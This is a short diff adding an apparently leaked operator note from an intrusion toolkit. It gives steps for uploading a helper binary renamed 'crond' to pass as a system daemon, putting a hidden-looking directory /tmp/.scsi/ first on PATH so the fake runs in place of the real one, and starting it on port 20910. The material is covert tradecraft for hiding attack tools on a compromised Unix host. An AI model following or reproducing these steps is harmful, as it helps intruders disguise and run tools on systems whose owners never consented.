@@ -1,0 +1,16 @@
+
+# To run a helper if you would like.
+# find a executable name that would blend in as well as a port
+
+-put /current/up/jlhelper.debain.sparc crond
+
+# Example
+-getenv
+
+-setenv PATH=/tmp/.scsi/:{put original path here}
+
+# make sure crond is from your directory.
+which crond
+echo 20910 | crond
+
+Enjoy....
